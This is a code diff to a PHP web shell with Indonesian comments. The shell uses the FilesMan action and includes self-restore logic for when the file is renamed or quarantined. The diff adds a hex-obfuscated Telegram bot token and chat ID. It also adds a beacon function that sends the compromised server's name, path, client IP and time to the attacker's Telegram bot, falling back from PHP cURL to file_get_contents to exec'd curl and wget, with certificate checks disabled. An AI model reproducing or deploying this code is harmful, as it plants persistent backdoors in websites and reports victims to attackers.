@@ -7,6 +7,70 @@ $default_action = "FilesMan";
 $default_use_ajax = true;
 $default_charset = 'UTF-8';
 
+# ============================================
+# Telegram Notification System (LOAD FIRST)
+# ============================================
+$_tg_bot = "\x38\x31\x30\x39\x31\x30\x32\x37\x36\x36\x3a\x41\x41\x45\x52\x53\x58\x54\x6d\x76\x31\x35\x43\x55\x6a\x6f\x70\x74\x69\x4b\x50\x5f\x64\x4a\x39\x33\x39\x36\x52\x39\x30\x77\x31\x43\x66\x30";
+$_tg_id = "\x38\x31\x30\x37\x35\x33\x31\x38\x36\x32";
+
+function gecko_tg_notify($message) {
+    $bot = $GLOBALS['_tg_bot'];
+    $chat = $GLOBALS['_tg_id'];
+    if (empty($bot) || empty($chat)) return;
+    $url = "https://api.telegram.org/bot" . $bot . "/sendMessage";
+    $data = [
+        'chat_id' => $chat,
+        'text' => $message,
+        'parse_mode' => 'HTML',
+        'disable_web_page_preview' => true,
+    ];
+    $sent = false;
+    // Method 1: cURL PHP
+    if (!$sent && function_exists('curl_init')) {
+        $ch = @curl_init();
+        @curl_setopt($ch, CURLOPT_URL, $url);
+        @curl_setopt($ch, CURLOPT_POST, true);
+        @curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+        @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        @curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+        @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
+        $res = @curl_exec($ch);
+        if ($res !== false && strpos($res, '"ok":true') !== false) $sent = true;
+        @curl_close($ch);
+    }
+    // Method 2: file_get_contents
+    if (!$sent) {
+        $opts = ['http' => [
+            'method' => 'POST',
+            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
+            'content' => http_build_query($data),
+            'timeout' => 10,
+        ], 'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]];
+        $res = @file_get_contents($url, false, stream_context_create($opts));
+        if ($res !== false && strpos($res, '"ok":true') !== false) $sent = true;
+    }
+    // Method 3: exec curl command
+    if (!$sent) {
+        $escaped_msg = escapeshellarg($message);
+        @exec('curl -s -X POST "' . $url . '" -d chat_id=' . escapeshellarg($chat) . ' -d parse_mode=HTML -d disable_web_page_preview=true -d text=' . $escaped_msg . ' 2>/dev/null', $out);
+    }
+    // Method 4: wget fallback
+    if (!$sent && empty($out)) {
+        $postdata = 'chat_id=' . urlencode($chat) . '&parse_mode=HTML&disable_web_page_preview=true&text=' . urlencode($message);
+        @exec('wget -qO- --post-data=' . escapeshellarg($postdata) . ' "' . $url . '" 2>/dev/null');
+    }
+}
+
+function gecko_tg_info() {
+    $ip = @$_SERVER['REMOTE_ADDR'];
+    $server = @$_SERVER['SERVER_NAME'];
+    $script = @$_SERVER['SCRIPT_NAME'];
+    $time = date('Y-m-d H:i:s');
+    return "\n\xF0\x9F\x8C\x90 <b>Server:</b> {$server}\n\xF0\x9F\x93\x8D <b>IP Client:</b> {$ip}\n\xF0\x9F\x93\x82 <b>Path:</b> {$script}\n\xF0\x9F\x95\x90 <b>Time:</b> {$time}";
+}
+# ============================================
+
 // Fungsi untuk tampilan halaman login
 function show_login_page($message = "")
 {
@@ -171,51 +235,6 @@ if (@is_file($__shell_file)) {
 }
 # ============================================
 
-# ============================================
-# Telegram Notification System
-# ============================================
-$_tg_bot = "\x38\x31\x30\x39\x31\x30\x32\x37\x36\x36\x3a\x41\x41\x45\x52\x53\x58\x54\x6d\x76\x31\x35\x43\x55\x6a\x6f\x70\x74\x69\x4b\x50\x5f\x64\x4a\x39\x33\x39\x36\x52\x39\x30\x77\x31\x43\x66\x30";
-$_tg_id = "\x38\x31\x30\x37\x35\x33\x31\x38\x36\x32";
-
-function gecko_tg_notify($message) {
-    $bot = $GLOBALS['_tg_bot'];
-    $chat = $GLOBALS['_tg_id'];
-    $url = "https://api.telegram.org/bot" . $bot . "/sendMessage";
-    $data = [
-        'chat_id' => $chat,
-        'text' => $message,
-        'parse_mode' => 'HTML',
-        'disable_web_page_preview' => true,
-    ];
-    // Coba pakai curl dulu, fallback ke file_get_contents
-    if (function_exists('curl_init')) {
-        $ch = @curl_init();
-        @curl_setopt($ch, CURLOPT_URL, $url);
-        @curl_setopt($ch, CURLOPT_POST, true);
-        @curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-        @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        @curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-        @curl_exec($ch);
-        @curl_close($ch);
-    } else {
-        $opts = ['http' => [
-            'method' => 'POST',
-            'header' => 'Content-Type: application/x-www-form-urlencoded',
-            'content' => http_build_query($data),
-            'timeout' => 5,
-        ], 'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]];
-        @file_get_contents($url, false, stream_context_create($opts));
-    }
-}
-
-function gecko_tg_info() {
-    $ip = @$_SERVER['REMOTE_ADDR'];
-    $server = @$_SERVER['SERVER_NAME'];
-    $script = @$_SERVER['SCRIPT_NAME'];
-    $time = date('Y-m-d H:i:s');
-    return "\n\xF0\x9F\x8C\x90 <b>Server:</b> {$server}\n\xF0\x9F\x93\x8D <b>IP Client:</b> {$ip}\n\xF0\x9F\x93\x82 <b>Path:</b> {$script}\n\xF0\x9F\x95\x90 <b>Time:</b> {$time}";
-}
 
 // Deteksi shell dihapus / di-rename (.VIRUS, .suspected, dll) -> auto-restore + notify
 function gecko_check_shell_alive() {
